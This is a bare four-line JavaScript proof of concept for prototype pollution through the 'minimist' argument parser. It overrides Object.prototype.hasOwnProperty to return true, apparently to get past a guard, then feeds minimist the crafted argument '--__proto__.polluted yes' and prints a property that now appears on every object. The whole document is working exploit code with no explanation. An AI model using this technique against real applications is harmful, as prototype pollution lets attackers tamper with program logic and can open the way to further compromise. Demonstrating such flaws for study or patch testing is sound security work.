Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
require('minimist')('--__proto__.polluted yes'.split(' '));
console.log({}.polluted);